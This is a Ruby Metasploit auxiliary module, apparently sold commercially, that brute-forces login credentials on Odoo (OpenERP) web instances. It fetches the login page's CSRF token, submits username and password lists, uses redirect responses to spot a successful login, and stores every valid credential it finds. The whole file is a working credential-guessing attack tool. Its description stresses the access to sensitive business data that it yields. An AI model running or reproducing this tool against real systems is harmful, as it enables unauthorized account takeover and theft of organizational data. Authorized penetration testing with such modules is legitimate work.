##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/http'

module Metasploit
  module Framework
    module LoginScanner
      class Odoo < ::Metasploit::Framework::LoginScanner::HTTP
        def attempt_login(credential)
          result_opts = {
            credential: credential,
            host: host,
            port: port,
            protocol: 'tcp',
            #service_name: 'http'
          }

          begin
            cli = Rex::Proto::Http::Client.new(host, port, {'Msf'=>framework,'MsfExploit'=>framework_module},ssl,ssl_version,proxies,http_username,http_password)
            configure_http_client(cli)
            cli.connect

            req = cli.request_cgi({
              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'web/login'
            })

            res = cli.send_recv(req)


            csrf = $1 if res && res.body =~ /<script type="text\/javascript">var odoo={csrf_token:"(.*?)",};<\/script>/

            req = cli.request_cgi({
              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'web/login',
              'method' => 'POST',
              'vars_post' => {
                'csrf_token' => csrf,
                'login' => credential.public,
                'password' => credential.private,
                'redirect' => ''
              },
              'cookie' => res.get_cookies
            })

            res = cli.send_recv(req)

            if res && res.code == 303
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res)
            elsif res && res.code == 200 && res.body =~ /<html><head><script>window.location='\/web[?]{0,1}'\+location.hash;<\/script><\/head><\/html>/
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res)
            else
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
            end

          rescue Exception => e
            result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
          end

          ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
        end
      end
    end
  end
end


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
        'Name'           => 'Odoo Bruteforce',
        'Description'    => %q(
        This module bruteforces weak credentials on Odoo (formerly OpenERP) instances.

        This module attempts to bruteforce weak credentials on Odoo (formerly OpenERP) instances.
Odoo is a popular open-source suite of applications for managing many aspects
of businesses and enterprises. Privileged access to an Odoo instance could
yield significant insight into an organization's high-value targets, as well
as sensitive or privileged information.

        Categories: Open Source, Enterprise

        Price: 3

        Video: https://asciinema.org/a/Of9jpkenoVABbe42DOk5G7OJZ

        OS: Multi

        Arch: Multi

        Requirements: Metasploit Framework
      ),
        'Author'         =>
          [
          ],
        'License'        => 'VolatileMinds',
        'References'     =>
          [
          ],
        'DefaultOptions' => {
            'RPORT'           => 443,
            'STOP_ON_SUCCESS' => true,
            'SSL' => true
        }
    )
  end

  def run_host(ip)
    cred_collection = ::Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::Odoo.new(
      configure_http_login_scanner(
        host: ip,
        port: datastore['RPORT'],
        uri: datastore['TARGETURI'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword'],
      )
    )

    scanner.scan! do |result|
      creds = result.to_h
      creds.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )

      if result.success?
        credcore = create_credential(creds)
        creds[:core] = credcore
        create_credential_login(creds)
        print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
      else
        invalidate_login(creds)
        vprint_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})")
      end
    end
  end
end
